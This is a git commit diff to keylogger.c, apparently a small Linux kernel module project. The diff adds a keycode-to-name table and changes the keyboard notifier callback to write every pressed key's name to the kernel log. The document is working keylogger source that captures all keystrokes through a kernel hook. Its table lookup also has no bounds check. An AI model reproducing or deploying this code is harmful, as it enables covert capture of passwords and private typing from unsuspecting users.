1777e53682d1c0388595c12a29f7a5934e615f80
Reilly Moore <yllierm519@gmail.com>
2015-12-02 02:43:48 -0500

    Prints actual character now

--- keylogger.c
+++ keylogger.c
@@ -10,6 +10,19 @@
 MODULE_AUTHOR("Reilly Moore, Brandon Cryderman");
 MODULE_LICENSE("GPL");
 
+//Based on this table
+//http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html
+//Not really sure what these values are based on
+static const char* keys[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
+                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
+                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
+                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
+                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
+                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
+                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
+                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
+                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
+
 /*
 	keyboard_notifier_callback
 	must be of the type notifier_fn_t(notifier_block *nb,
@@ -22,12 +35,8 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
 		http://lxr.free-electrons.com/source/include/linux/notifier.h#L206
 		for action == KBD_KEYCODE
 	*/
-	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED){
-		printk(KERN_DEBUG "{\n");
-		printk(KERN_DEBUG "		kb->down: %d\n", kb->down);
-		printk(KERN_DEBUG "		kb->shift: %d\n", kb->shift);
-		printk(KERN_DEBUG "		kb->ledstate: %d\n", kb->ledstate);
-		printk(KERN_DEBUG "		kb->value: %d\n}\n", kb->value);
+	if(action == KBD_KEYCODE && kb->down == KEY_PRESSED) {
+		printk(KERN_DEBUG "Key pressed: %s\n", keys[kb->value]);
 	}
 
 	return 0;
